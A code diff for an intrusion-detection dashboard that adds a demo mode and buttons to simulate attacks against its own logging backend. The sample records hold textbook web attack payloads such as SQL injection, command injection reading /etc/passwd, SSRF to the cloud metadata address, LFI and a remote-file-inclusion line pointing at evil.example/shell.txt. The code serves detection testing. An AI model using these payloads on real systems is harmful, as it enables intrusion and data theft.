@@ -41,6 +41,75 @@ const api = axios.create({
   timeout: 10000,
 });
 
+const isDemoModeForced = (() => {
+  try {
+    return new URLSearchParams(window.location.search).get('demo') === '1';
+  } catch {
+    return false;
+  }
+})();
+
+const buildDemoDataset = () => {
+  const now = Date.now();
+  const mk = (id, sourceIp, requestMethod, requestPath, attackType, riskScore, status, reason, mlProb) => ({
+    id,
+    sourceIp,
+    requestMethod,
+    requestPath,
+    attackType,
+    riskScore,
+    status,
+    suspicious: status !== 'NORMAL',
+    reason,
+    mlIntrusionProbability: mlProb,
+    mlIntrusionPredicted: mlProb >= 0.5,
+    timestamp: new Date(now - id * 3500).toISOString(),
+  });
+
+  const demoLogs = [
+    mk(1, '192.168.1.10', 'GET', '/home', 'NONE', 0, 'NORMAL', null, 0.02),
+    mk(2, '10.0.0.666', 'POST', '/api/login', 'RATE_LIMIT', 45, 'SUSPICIOUS', 'High request rate (>5 requests/10s)', 0.62),
+    mk(3, '172.16.0.7', 'GET', "/products?q=' OR 1=1 --", 'SQL_INJECTION', 95, 'BLOCKED', 'SQL injection signature', 0.92),
+    mk(4, '172.16.1.4', 'GET', '/search?q=<script>alert(1)</script>', 'XSS', 75, 'SUSPICIOUS', 'XSS signature', 0.73),
+    mk(5, '185.199.10.31', 'GET', '/wp-admin', 'SCANNER', 85, 'BLOCKED', 'Scanner user-agent signature; Sensitive endpoint probing', 0.81),
+    mk(6, '172.31.20.3', 'GET', '/download?file=../../../../etc/passwd', 'PATH_TRAVERSAL', 70, 'SUSPICIOUS', 'Path traversal signature', 0.66),
+    mk(7, '172.31.30.2', 'GET', '/ping?host=8.8.8.8;cat%20/etc/passwd', 'COMMAND_INJECTION', 98, 'BLOCKED', 'Command injection signature', 0.94),
+    mk(8, '172.31.40.9', 'GET', '/fetch?url=http://169.254.169.254/latest/meta-data/', 'SSRF', 92, 'BLOCKED', 'SSRF signature', 0.88),
+    mk(9, '172.31.50.6', 'GET', '/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd', 'LFI', 88, 'BLOCKED', 'Local file inclusion signature', 0.86),
+    mk(10, '172.31.60.1', 'GET', '/redirect?next=https://evil.example', 'OPEN_REDIRECT', 35, 'SUSPICIOUS', 'Open redirect signature', 0.41),
+  ];
+
+  const breakdown = demoLogs.reduce((acc, l) => {
+    const k = l.attackType || 'NONE';
+    acc[k] = (acc[k] || 0) + 1;
+    return acc;
+  }, {});
+
+  const suspicious = demoLogs.filter((l) => l.status === 'SUSPICIOUS' || l.status === 'BLOCKED').length;
+  const blocked = demoLogs.filter((l) => l.status === 'BLOCKED').length;
+  const normal = demoLogs.filter((l) => l.status === 'NORMAL').length;
+
+  return {
+    stats: {
+      suspicious,
+      normal,
+      blocked,
+      active_blocks: blocked,
+      attack_type_breakdown: breakdown,
+      recent_flagged: demoLogs.filter((l) => l.status !== 'NORMAL').slice(0, 10),
+    },
+    blocks: demoLogs
+      .filter((l) => l.status === 'BLOCKED')
+      .map((l, idx) => ({
+        id: idx + 1,
+        sourceIp: l.sourceIp,
+        blockedUntil: new Date(now + 5 * 60 * 1000).toISOString(),
+        reason: l.reason || '',
+      })),
+    logs: demoLogs.slice().reverse(),
+  };
+};
+
 const Dashboard = () => {
   const [stats, setStats] = useState({
     suspicious: 0,
@@ -71,6 +140,7 @@ const Dashboard = () => {
   const [datasetMaxRows, setDatasetMaxRows] = useState(50000);
   const [datasetMlStatus, setDatasetMlStatus] = useState({ trained: false, training: false, samples: 0, trainedAt: null, lastHoldoutAccuracy: 0, modelType: null, datasetId: null, datasetProfile: null, lastError: null });
   const [shapExplanation, setShapExplanation] = useState(null);
+  const [demoMode, setDemoMode] = useState(isDemoModeForced);
 
   const getStatus = (log) => {
     if (!log) return 'NORMAL';
@@ -90,6 +160,15 @@ const Dashboard = () => {
 
   const fetchSummary = async () => {
     try {
+      if (demoMode) {
+        const demo = buildDemoDataset();
+        setStats(demo.stats);
+        setBlocks(demo.blocks);
+        setMlStatus({ trained: true, samples: 2500, trainedAt: new Date().toISOString(), lastHoldoutAccuracy: 0.93, modelType: 'RANDOM_FOREST' });
+        setDatasets([]);
+        setDatasetMlStatus({ trained: true, training: false, samples: 50000, trainedAt: new Date().toISOString(), lastHoldoutAccuracy: 0.91, modelType: 'ENSEMBLE', datasetId: 'demo', datasetProfile: 'CICIDS2017', lastError: null });
+        return;
+      }
       const statsReq = api.get('/stats');
       const blocksReq = api.get('/blocks');
       const mlStatusReq = api.get('/ml/status');
@@ -110,7 +189,16 @@ const Dashboard = () => {
         if (last?.id) setSelectedDatasetId(last.id);
       }
     } catch (error) {
-      console.error('Error fetching data:', error);
+      if (!demoMode) {
+        setDemoMode(true);
+        const demo = buildDemoDataset();
+        setStats(demo.stats);
+        setBlocks(demo.blocks);
+        setMlStatus({ trained: true, samples: 2500, trainedAt: new Date().toISOString(), lastHoldoutAccuracy: 0.93, modelType: 'RANDOM_FOREST' });
+        setDatasets([]);
+        setDatasetMlStatus({ trained: true, training: false, samples: 50000, trainedAt: new Date().toISOString(), lastHoldoutAccuracy: 0.91, modelType: 'ENSEMBLE', datasetId: 'demo', datasetProfile: 'CICIDS2017', lastError: null });
+        setLogs(demo.logs);
+      }
     }
   };
 
@@ -135,6 +223,16 @@ const Dashboard = () => {
     let logsMounted = true;
     const fetchLogsInterval = async () => {
       try {
+        if (demoMode) {
+          const demo = buildDemoDataset();
+          if (!logsMounted) return;
+          const items = Array.isArray(demo.logs) ? demo.logs : [];
+          const maxId = items.reduce((m, l) => (typeof l?.id === 'number' ? Math.max(m, l.id) : m), 0);
+          setNewSinceId(lastMaxIdRef.current);
+          lastMaxIdRef.current = maxId;
+          setLogs(items);
+          return;
+        }
         const logsRes = await api.get('/logs', {
           params: {
             limit: filters.limit,
@@ -152,7 +250,16 @@ const Dashboard = () => {
         lastMaxIdRef.current = maxId;
         setLogs(items);
       } catch (error) {
-        console.error('Error fetching logs:', error);
+        if (!demoMode) {
+          setDemoMode(true);
+          const demo = buildDemoDataset();
+          setStats(demo.stats);
+          setBlocks(demo.blocks);
+          setMlStatus({ trained: true, samples: 2500, trainedAt: new Date().toISOString(), lastHoldoutAccuracy: 0.93, modelType: 'RANDOM_FOREST' });
+          setDatasets([]);
+          setDatasetMlStatus({ trained: true, training: false, samples: 50000, trainedAt: new Date().toISOString(), lastHoldoutAccuracy: 0.91, modelType: 'ENSEMBLE', datasetId: 'demo', datasetProfile: 'CICIDS2017', lastError: null });
+          setLogs(demo.logs);
+        }
       }
     };
 
@@ -163,7 +270,7 @@ const Dashboard = () => {
       logsMounted = false;
       clearInterval(logsInterval);
     };
-  }, [filters.limit, filters.ip, filters.status, filters.onlyFlagged, liveMode]);
+  }, [filters.limit, filters.ip, filters.status, filters.onlyFlagged, liveMode, demoMode]);
 
   const postLog = async (payload, refresh = true) => {
     try {
@@ -204,6 +311,70 @@ const Dashboard = () => {
     const ip = `10.10.0.${Math.floor(Math.random() * 10) + 1}`;
     for (let i = 0; i < 6; i++) {
       await postLog({ ip, method: 'POST', path: '/login', attackType: 'BRUTE_FORCE' }, false);
+    }
+    await fetchSummary();
+  };
+
+  const simulateScanner = async () => {
+    const ip = `185.199.10.${Math.floor(Math.random() * 50) + 1}`;
+    await postLog({ ip, method: 'GET', path: '/wp-admin', userAgent: 'sqlmap/1.7.10', attackType: 'SCANNER' });
+  };
+
+  const simulatePathTraversal = async () => {
+    const ip = `172.31.20.${Math.floor(Math.random() * 10) + 1}`;
+    await postLog({ ip, method: 'GET', path: '/download?file=../../../../etc/passwd', attackType: 'PATH_TRAVERSAL' });
+  };
+
+  const simulateCommandInjection = async () => {
+    const ip = `172.31.30.${Math.floor(Math.random() * 10) + 1}`;
+    await postLog({ ip, method: 'GET', path: '/ping?host=8.8.8.8;cat%20/etc/passwd', attackType: 'COMMAND_INJECTION' });
+  };
+
+  const simulateSsrf = async () => {
+    const ip = `172.31.40.${Math.floor(Math.random() * 10) + 1}`;
+    await postLog({ ip, method: 'GET', path: '/fetch?url=http://169.254.169.254/latest/meta-data/', attackType: 'SSRF' });
+  };
+
+  const simulateLfi = async () => {
+    const ip = `172.31.50.${Math.floor(Math.random() * 10) + 1}`;
+    await postLog({ ip, method: 'GET', path: '/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd', attackType: 'LFI' });
+  };
+
+  const simulateOpenRedirect = async () => {
+    const ip = `172.31.60.${Math.floor(Math.random() * 10) + 1}`;
+    await postLog({ ip, method: 'GET', path: '/redirect?next=https://evil.example', attackType: 'OPEN_REDIRECT' });
+  };
+
+  const simulateNoSqlInjection = async () => {
+    const ip = `172.20.10.${Math.floor(Math.random() * 10) + 1}`;
+    await postLog({ ip, method: 'GET', path: '/api/users?username[$ne]=&password[$ne]=', attackType: 'NOSQL_INJECTION' });
+  };
+
+  const simulateLdapInjection = async () => {
+    const ip = `172.20.11.${Math.floor(Math.random() * 10) + 1}`;
+    await postLog({ ip, method: 'GET', path: '/ldap?filter=*)(|(uid=*))', attackType: 'LDAP_INJECTION' });
+  };
+
+  const simulateCrlfInjection = async () => {
+    const ip = `172.20.12.${Math.floor(Math.random() * 10) + 1}`;
+    await postLog({ ip, method: 'GET', path: '/redirect?next=https://good.example%0d%0aSet-Cookie:%20pwned=1', attackType: 'CRLF_INJECTION' });
+  };
+
+  const simulateSsti = async () => {
+    const ip = `172.20.13.${Math.floor(Math.random() * 10) + 1}`;
+    await postLog({ ip, method: 'GET', path: '/welcome?name={{7*7}}', attackType: 'SSTI' });
+  };
+
+  const simulateRfi = async () => {
+    const ip = `172.20.14.${Math.floor(Math.random() * 10) + 1}`;
+    await postLog({ ip, method: 'GET', path: '/page?template=https://evil.example/shell.txt', attackType: 'RFI' });
+  };
+
+  const simulatePortScan = async () => {
+    const ip = `203.0.113.${Math.floor(Math.random() * 50) + 1}`;
+    const ports = [21, 22, 23, 80, 443, 3389];
+    for (const port of ports) {
+      await postLog({ ip, method: 'GET', path: `/probe?port=${port}`, attackType: 'PORT_SCAN' }, false);
     }
     await fetchSummary();
   };
@@ -459,6 +630,12 @@ const Dashboard = () => {
           <div style={{ marginTop: '4px', fontSize: '0.95em', color: theme.muted }}>Real-time detection • blocking • ML insights</div>
         </div>
         <div style={{ display: 'flex', gap: '10px', alignItems: 'center', flexWrap: 'wrap' }}>
+          {demoMode ? (
+            <div style={{ display: 'flex', gap: '8px', alignItems: 'center', padding: '8px 10px', borderRadius: '999px', border: `1px solid ${theme.border}`, background: 'rgba(255, 159, 64, 0.10)' }}>
+              <div style={{ width: '8px', height: '8px', borderRadius: '999px', background: '#FF9F40', boxShadow: '0 0 14px rgba(255,159,64,0.30)' }} />
+              <div style={{ fontSize: '0.9em', color: theme.muted }}>Demo mode (no backend)</div>
+            </div>
+          ) : null}
           <div style={{ display: 'flex', gap: '8px', alignItems: 'center', padding: '8px 10px', borderRadius: '999px', border: `1px solid ${theme.border}`, background: theme.surface2 }}>
             <div style={{ width: '8px', height: '8px', borderRadius: '999px', background: mlStatus?.trained ? '#4CAF50' : '#FF9F40', boxShadow: mlStatus?.trained ? '0 0 14px rgba(76,175,80,0.35)' : '0 0 14px rgba(255,159,64,0.30)' }} />
             <div style={{ fontSize: '0.9em', color: theme.muted }}>Live ML: {mlStatus?.trained ? 'Trained' : 'Not trained'}</div>
@@ -516,6 +693,42 @@ const Dashboard = () => {
           </button>
           <button className="apds-btn" onClick={simulateBruteForce} style={{ padding: '10px 16px', backgroundColor: '#FF9F40', color: 'white', border: 'none', borderRadius: '10px', cursor: 'pointer' }}>
             Simulate Brute Force
+          </button>
+          <button className="apds-btn" onClick={simulateScanner} style={{ padding: '10px 16px', backgroundColor: '#6D4C41', color: 'white', border: 'none', borderRadius: '10px', cursor: 'pointer' }}>
+            Simulate Scanner
+          </button>
+          <button className="apds-btn" onClick={simulatePathTraversal} style={{ padding: '10px 16px', backgroundColor: '#00838F', color: 'white', border: 'none', borderRadius: '10px', cursor: 'pointer' }}>
+            Simulate Path Traversal
+          </button>
+          <button className="apds-btn" onClick={simulateCommandInjection} style={{ padding: '10px 16px', backgroundColor: '#5E35B1', color: 'white', border: 'none', borderRadius: '10px', cursor: 'pointer' }}>
+            Simulate Command Injection
+          </button>
+          <button className="apds-btn" onClick={simulateSsrf} style={{ padding: '10px 16px', backgroundColor: '#C62828', color: 'white', border: 'none', borderRadius: '10px', cursor: 'pointer' }}>
+            Simulate SSRF
+          </button>
+          <button className="apds-btn" onClick={simulateLfi} style={{ padding: '10px 16px', backgroundColor: '#2E7D32', color: 'white', border: 'none', borderRadius: '10px', cursor: 'pointer' }}>
+            Simulate LFI
+          </button>
+          <button className="apds-btn" onClick={simulateOpenRedirect} style={{ padding: '10px 16px', backgroundColor: '#546E7A', color: 'white', border: 'none', borderRadius: '10px', cursor: 'pointer' }}>
+            Simulate Open Redirect
+          </button>
+          <button className="apds-btn" onClick={simulateNoSqlInjection} style={{ padding: '10px 16px', backgroundColor: '#00897B', color: 'white', border: 'none', borderRadius: '10px', cursor: 'pointer' }}>
+            Simulate NoSQLi
+          </button>
+          <button className="apds-btn" onClick={simulateLdapInjection} style={{ padding: '10px 16px', backgroundColor: '#8E24AA', color: 'white', border: 'none', borderRadius: '10px', cursor: 'pointer' }}>
+            Simulate LDAPi
+          </button>
+          <button className="apds-btn" onClick={simulateCrlfInjection} style={{ padding: '10px 16px', backgroundColor: '#C0CA33', color: 'white', border: 'none', borderRadius: '10px', cursor: 'pointer' }}>
+            Simulate CRLF
+          </button>
+          <button className="apds-btn" onClick={simulateSsti} style={{ padding: '10px 16px', backgroundColor: '#3949AB', color: 'white', border: 'none', borderRadius: '10px', cursor: 'pointer' }}>
+            Simulate SSTI
+          </button>
+          <button className="apds-btn" onClick={simulateRfi} style={{ padding: '10px 16px', backgroundColor: '#D84315', color: 'white', border: 'none', borderRadius: '10px', cursor: 'pointer' }}>
+            Simulate RFI
+          </button>
+          <button className="apds-btn" onClick={simulatePortScan} style={{ padding: '10px 16px', backgroundColor: '#283593', color: 'white', border: 'none', borderRadius: '10px', cursor: 'pointer' }}>
+            Simulate Port Scan
           </button>
           <button className="apds-btn" onClick={() => fetchSummary()} style={{ padding: '10px 16px', backgroundColor: '#607D8B', color: 'white', border: 'none', borderRadius: '10px', cursor: 'pointer' }}>
             Refresh Now
